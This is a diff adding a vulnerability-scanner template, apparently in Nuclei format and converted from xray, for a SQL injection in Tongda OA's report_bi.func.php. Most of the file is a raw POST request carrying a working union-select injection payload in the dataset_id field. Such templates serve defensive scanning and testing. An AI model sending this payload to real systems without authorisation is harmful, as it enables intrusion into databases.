@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-oa-report-bi-func-php-sqli
+
+info:
+  name: poc-yaml-tongda-oa-report-bi-func-php-sqli
+  author: sharecast
+  severity: high
+  tags: xray-converted,sqli,ct-416624
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _POST[dataset_id]=efgh'-@`'`)union+select+1,2,md5({{rand_int(1000, 9999)}})#'&action=get_link_info
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
